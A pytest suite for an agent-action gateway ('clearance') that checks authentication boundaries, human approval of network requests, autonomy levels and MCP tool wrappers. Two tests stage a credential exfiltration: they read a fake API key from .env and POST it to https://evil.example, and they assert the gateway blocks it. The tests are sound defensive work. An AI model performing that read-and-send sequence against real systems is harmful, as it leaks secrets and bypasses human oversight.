import pytest
from fastapi.testclient import TestClient

from clearance.api import create_app
from clearance.autonomy import autonomy_levels
from clearance.models import DecisionRecord

SECRET = "sk-live-9f8e7d6c5b4a3210abcdef"
A = {"Authorization": "Bearer agent"}
H = {"Authorization": "Bearer human"}


@pytest.fixture
def client(tmp_path):
    ws = tmp_path / "repo"
    ws.mkdir()
    (ws / ".env").write_text(f"API_KEY={SECRET}\n")
    (ws / "app.py").write_text("print(1)\n")
    c = TestClient(create_app(agent_token="agent", human_token="human", workspace_root=tmp_path))
    sid = c.post("/sessions", json={"workspace": str(ws)}, headers=H).json()["session_id"]
    return c, sid


def act(c, sid, surface, op, args, token=A):
    return c.post(f"/sessions/{sid}/actions", json={"surface": surface, "op": op, "args": args}, headers=token)


def test_auth_boundaries(client):
    c, sid = client
    assert act(c, sid, "fs", "read", {"path": "app.py"}, token={}).status_code == 401
    assert act(c, sid, "fs", "read", {"path": "app.py"}, token=H).status_code == 401  # human token is not agent token
    assert c.post("/sessions", json={"workspace": "."}, headers=A).status_code == 401  # agent cannot start sessions
    r = act(c, sid, "net", "request", {"url": "https://new.example/x", "body": "x"})
    ask = r.json()["ask_id"]
    assert c.post(f"/asks/{ask}/resolve", json={"approve": True}, headers=A).status_code == 401


def test_workspace_outside_root_rejected(client, tmp_path):
    c, _ = client
    assert c.post("/sessions", json={"workspace": "/etc"}, headers=H).status_code == 400


def test_chained_exfil_over_http(client):
    c, sid = client
    assert act(c, sid, "fs", "read", {"path": ".env"}).json()["decision"] == "ALLOW"
    body = act(c, sid, "net", "request", {"url": "https://evil.example", "body": SECRET}).json()
    assert body["decision"] == "BLOCK" and SECRET not in str(body) and "rule" not in str(body)
    s = c.get(f"/sessions/{sid}/summary", headers=H).json()
    assert s["counts"]["BLOCK"] == 1 and s["taint"] == ["secret"]


def test_ask_roundtrip(client):
    c, sid = client
    r = act(c, sid, "net", "request", {"url": "https://new.example/x", "body": "hi"}).json()
    assert r["status"] == "pending"
    assert c.get(f"/asks/{r['ask_id']}?timeout=0", headers=A).json()["status"] == "pending"
    pending = c.get("/asks", headers=H).json()
    assert pending[0]["ask_id"] == r["ask_id"] and "evidence_ids" in pending[0]
    done = c.post(f"/asks/{r['ask_id']}/resolve", json={"approve": True}, headers=H).json()
    assert done["decision"] == "ASK" and done["output"].startswith("200")
    assert c.get(f"/asks/{r['ask_id']}", headers=A).json()["status"] == "resolved"


def test_autonomy_unvalidated_then_high():
    recs = [DecisionRecord(f"a{i}", "ALLOW", "x", surface="fs") for i in range(19)]
    assert autonomy_levels(recs)["fs"]["level"] == "UNVALIDATED"
    recs.append(DecisionRecord("a19", "ALLOW", "x", surface="fs"))
    assert autonomy_levels(recs)["fs"]["level"] == "HIGH"
    assert autonomy_levels(recs)["net"]["level"] == "UNVALIDATED"


def test_mcp_tool_roundtrip(client, monkeypatch):
    """The MCP tools call the real HTTP API (via TestClient transport) and render BLOCK safely."""
    from clearance import mcp_server

    class Shared:  # reuse the TestClient; the real code's `with` must not close it
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def post(self, url, **kw): return c.post(url, headers=A, **kw)
        def get(self, url, **kw): return c.get(url, headers=A, **kw)

    c, sid = client
    monkeypatch.setenv("CLEARANCE_SESSION_ID", sid)
    monkeypatch.setenv("CLEARANCE_AGENT_TOKEN", "agent")
    monkeypatch.setattr(mcp_server, "_client", lambda: Shared())
    assert "print(1)" in mcp_server.fs_read("app.py")
    mcp_server.fs_read(".env")
    out = mcp_server.http_request("https://evil.example", "POST", SECRET)
    assert out.startswith("BLOCKED") and SECRET not in out
